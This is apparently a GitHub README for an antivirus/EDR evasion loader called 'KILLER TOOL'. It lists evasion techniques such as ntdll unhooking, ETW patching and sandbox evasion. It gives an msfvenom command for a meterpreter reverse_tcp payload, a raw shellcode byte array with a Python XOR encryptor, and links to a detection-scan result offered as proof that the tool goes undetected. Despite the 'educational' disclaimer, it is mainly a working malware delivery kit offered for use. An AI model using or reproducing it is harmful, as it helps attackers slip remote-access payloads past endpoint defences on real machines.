# KILLER TOOL (EDR Evasion)
It's a AV/EDR Evasion tool created to bypass security tools for learning, until now the tool is FUD.

# Features:

* Module Stomping for Memory scanning evasion
* DLL Unhooking by fresh ntdll copy
* IAT Hiding and Obfuscation & API Unhooking
* ETW Patchnig for bypassing some security controls
* Included sandbox evasion techniques & Basic Anti-Debugging
* Fully obfuscated (Functions - Keys - Shellcode) by XOR-ing
* Shellcode reversed and Encrypted
* Moving payload into hallowed memory without using APIs 
* GetProcAddress & GetModuleHandle Implementation by @cocomelonc
* Runs without creating new thread & Suppoers x64 and x86 arch

# How to use it

Generate your shellcode with msfvenom tool :

      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<IP> LPORT<PORT> -f py
      
 Then copy the output into the encryptor XOR function :
 
        data = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

        key  = 0x50 # Put here your key as byte like for example (0x90 or 0x40 or 0x30) and more...

        print('{ ', end='')
        for i in data:
            print(hex(i ^ key), end=', ')

        print("0x0 };") # Notice that it adds one byte "0x0" to the end.

And then you can handle your decryption function, It's not easy for script kiddies ^-^, you can read more about it in my articale : 

* Part 1 => https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5
* Part 2 => https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354
* Part 3 => https://medium.com/@0xHossam/unhooking-memory-object-hiding-3229b75618f7
* Part 4 => https://medium.com/@0xHossam/av-edr-evasion-malware-development-p-4-162662bb630e

This is the result when running :

![image](https://user-images.githubusercontent.com/82971998/230731975-a70abd1c-279b-4e79-9e91-6b5212b7db9a.png)

# PoC (Proof-of-Concept) :

https://antiscan.me/images/result/07OkIKKhpRsG.png

![image](https://user-images.githubusercontent.com/82971998/230732045-ca2638fe-4f3c-4926-8f94-4fff817ca585.png)

# Important Notes

* First thanks to Abdallah Mohammed for helping me to develop it ^_^
* The tool is for educational purposes only
* Compile the code with visual studio compiler

